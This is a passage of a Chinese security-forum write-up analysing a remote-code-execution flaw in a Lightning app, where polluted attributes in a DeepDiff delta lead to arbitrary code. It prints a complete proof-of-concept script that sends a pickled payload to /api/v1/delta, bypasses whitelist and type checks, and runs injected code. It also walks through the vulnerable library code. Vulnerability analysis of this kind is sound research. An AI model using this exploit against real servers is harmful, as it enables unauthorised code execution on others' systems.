---
title: 某系统因属性污染导致的RCE漏洞分析
url: https://forum.butian.net/share/3836
source: 奇安信攻防社区
date: 2024-11-15
fetch_date: 2025-10-06T19:13:35.971222
---

# 某系统因属性污染导致的RCE漏洞分析

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 某系统因属性污染导致的RCE漏洞分析

* [漏洞分析](https://forum.butian.net/topic/48)

前几天在逛huntr的时候，发现一个很有意思的漏洞，他是通过反序列化从而去污染类和属性导致的rce，在作者的描述中大致说明的漏洞的原理，该漏洞是通过绕过`Deepdiff `的反序列化限制，包括绕过魔术方法和白名单绕过，通过魔术方法可以访问其他模块、类和实例，并使用这种任意属性写入，最终导致rce。

1、漏洞介绍
------
前几天在逛huntr的时候，发现一个很有意思的漏洞，他是通过反序列化从而去污染类和属性导致的rce，在作者的描述中大致说明的漏洞的原理，该漏洞是通过绕过`Deepdiff`的反序列化限制，包括绕过魔术方法和白名单绕过，通过魔术方法可以访问其他模块、类和实例，并使用这种任意属性写入，最终导致rce。
> 原文链接：<https://huntr.com/bounties/486add92-275e-4a7b-92f9-42d84bc759da>
这里我将原版的poc稍加进行改造，将Helper class转换后的内容直接写了出来，方便分析。
```python
import requests, time, pickle, pickletools
from collections import namedtuple
from ordered\_set import OrderedSet
def send\_delta(d):
requests.post(server\_host + '/api/v1/delta', headers={
'x-lightning-type': '1',
'x-lightning-session-uuid': '1',
'x-lightning-session-id': '1'
}, json={"delta": d})
# Monkey patch OrderedSet reduce to make it easier to pickle
OrderedSet.\_\_reduce\_\_ = lambda self, \*args: (OrderedSet, ())
server\_host = 'http://127.0.0.1:7501'
command = 'dir'
# this code is injected and ran on the remote host
injected\_code = f"\_\_import\_\_('os').system('calc.exe')" + '''
import lightning, sys
from lightning.app.api.request\_types import \_DeltaRequest, \_APIRequest
lightning.app.core.app.\_DeltaRequest = \_DeltaRequest
from lightning.app.structures.dict import Dict
lightning.app.structures.Dict = Dict
from lightning.app.core.flow import LightningFlow
lightning.app.core.LightningFlow = LightningFlow
LightningFlow.\_INTERNAL\_STATE\_VARS = {"\_paths", "\_layout"}
lightning.app.utilities.commands.base.\_APIRequest = \_APIRequest
del sys.modules['lightning.app.utilities.types']'''
bypass\_isinstance = OrderedSet
delta = {
'attribute\_added': {
"root['function']": namedtuple,
# 绕过\_collect\_deltas\_from\_ui\_and\_work\_queues中的isinstance(delta, \_DeltaRequest)
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].core.app.\_DeltaRequest": str,
# 绕过\_process\_requests中的isinstance(request, \_APIRequest)
"root['bypass\_isinstance']": bypass\_isinstance,
# 将OrderedSet的\_\_instancecheck\_\_设置有内容使其返回true，但不可为可迭代的，否则isinstance会报错
"root['bypass\_isinstance'].'\_\_instancecheck\_\_'": str,
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].utilities.commands.base.\_APIRequest": bypass\_isinstance(),
# 绕过get\_component\_by\_name中的isinstance(current, LightningDict)，使其能够遍历普通字典
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].structures.Dict": dict,
# 绕过get\_component\_by\_name中的if not isinstance(child, ComponentTuple):
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].core.LightningFlow": bypass\_isinstance(),
"root['function'].'\_\_globals\_\_'['\_sys'].modules['typing'].Union": list,
# 防止前面程序报错将`provided\_state["vars"]`覆盖为空，就不会经过for循环
"root['vars']": {},
# or 将`\_INTERNAL\_STATE\_VARS`覆盖为空，也不会进入报错对应的if条件语句里。
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].core.flow.LightningFlow.\_INTERNAL\_STATE\_VARS": (),
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].api.request\_types.\_DeltaRequest.name": "root.\_\_init\_\_.\_\_builtins\_\_.exec",
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].api.request\_types.\_DeltaRequest.method\_name": "\_\_call\_\_",
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].api.request\_types.\_DeltaRequest.args": (injected\_code,),
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].api.request\_types.\_DeltaRequest.kwargs": {},
"root['function'].'\_\_globals\_\_'['\_sys'].modules['lightning.app'].api.request\_types.\_DeltaRequest.id": "root"
}
}
payload = pickletools.optimize(pickle.dumps(delta, 1)).decode() \
.replace('\_\_builtin\_\_', 'builtins') \
.replace('unicode', 'str')
# Sends the payload and does all of our attribute pollution
send\_delta(payload)
# Small delay to ensure payload was processed
time.sleep(0.2)
send\_delta({}) # Code path triggers when this delta is recieved
```
接下来我将结合poc和代码对此漏洞进行分析
2、漏洞入口及反序列化点
------------
首先来看触发反序列化的点以及入口
![image-20240912173227906](https://oss-yg-cztt.yun.qianxin.com/butian-public/f992fbee22c61f2bf6c4e3b33301a8c00.png)
当访问`/api/v1/delta`的接口时，从请求体中获取JSON数据并解析为字典类型，并取字典中的值`delta`作为参数实例化`Delta`，最后放入`api\_app\_delta\_queue`队列中。
在实例化的过程中，会判断传入的类型，如果传入的字符串类型的则会调用`pickle\_load`进行反序列化
![image-20240912174847719](https://oss-yg-cztt.yun.qianxin.com/butian-public/fb405d081aa959f726b8e4afb3fefce2e.png)
在反序列化的时候会有一个白名单，需要反序列化的类必须在白名单里，所以一些常规的反序列化漏洞在这里都不能用。
![image-20240911163008161](https://oss-yg-cztt.yun.qianxin.com/butian-public/f6ae379ae6ccafc7c8b5f9db244dd3198.png)
3、漏洞利用方式
--------
看完了入口和反序列化，主要来看一下漏洞利用方式。
在随后的代码中，程序会先从队列中去除`delta`对象，如果有多个的话会被其进行遍历，然后进行`+`操作
![image-20240911105732717](https://oss-yg-cztt.yun.qianxin.com/butian-public/fe9d112ddb1a374017718228bbd954d15.png)
在进行`+`操作时，实际上时调用类中的`\_\_add\_\_`方法，在此方法中，我们主要看一下`self.\_do\_attribute\_added()`，
![image-20240911105453074](https://oss-yg-cztt.yun.qianxin.com/butian-public/f49e70bcb2d0caa68528273eb63258f17.png)
在`self.\_do\_attribute\_added()`中，获取`attribute\_added`中的内容，然后之后会根据其内容中的键值对动态的给类添加属性和值
![image-20240911105950923](https://oss-yg-cztt.yun.qianxin.com/butian-public/f034827b030a438e935b9fe492734ac67.png)
这里的`attribute\_added`依然是我们传入的字典，只不过内容已经是反序列化后的内容
![image-20240911110604348](https://oss-yg-cztt.yun.qianxin.com/butian-public/fcd60c27ddd3e519a285224a1b20bf59f.png)
`\_do\_item\_added()`的关键代码如下
```python
def \_do\_item\_added(self, items, sort=True, insert=False):
if sort:
try:
items = sorted(items.items(), key=self.\_sort\_key\_for\_item\_added)
except TypeError:
items = sorted(items.items(), key=cmp\_to\_key(self.\_sort\_comparison))
else:
items = items.items()
for path, new\_value in items:
elem\_and\_details = self.\_get\_elements\_and\_details(path)
if elem\_and\_details:
elements, parent, parent\_to\_obj\_elem, parent\_to\_obj\_action, obj, elem, action = elem\_and\_details
else:
continue
# Insert is only true for iterables, make sure it is a valid index.
if(insert and elem < len(obj)):
obj.insert(elem, None)
self.\_set\_new\_value(parent, parent\_to\_obj\_elem, parent\_to\_obj\_action,
obj, elements, path, elem, action, new\_value)
```
在`\_do\_item\_added`中首先进行排序，然后遍历排序后的字典，使用`self.\_get\_elements\_and\_details`方法通过字典中的键，也就是路径解析来定位对象，最后通过 `\_set\_new\_value()` 使用字典的值更新最终的值。由于值以及时我们反序列化后的内容，所以这里的值可以为任何类型，例如对象，字符串，字典等。
这里主要关注的有两点，一是程序如何对路径进行解析的，二是如何动态的给类添加属性
首先来看对路径的解析，下面是获取路径中元素的方法：
```python
def \_get\_elements\_and\_details(self, path):
try:
elements = \_path\_to\_elements(path) # 解析给定的路径，返回一个元组
if len(elements) > 1:
elements\_subset = elements[:-2]
if len(elements\_subset) != len(elements):
next\_element = elements[-2][0]
next2\_element = elements[-1][0]
else:
next\_element = None
parent = self.get\_nested\_obj(obj=self, elements=elements\_subset, next\_element=next\_element)
parent\_to\_obj\_elem, parent\_to\_obj\_action = elements[-2]
obj = self.\_get\_elem\_and\_compare\_to\_old\_value(
obj=parent, path\_for\_err\_reporting=path, expected\_old\_value=None,
elem=parent\_to\_obj\_elem, action=parent\_to\_obj\_action, next\_element=next2\_element)
except Exception as e:
self.\_raise\_or\_log(UNABLE\_TO\_GET\_ITEM\_MSG.format(path, e))
return None
return elements, parent, parent\_to\_obj\_elem, parent\_to\_obj\_action, obj, elem, action
```
首先通过`...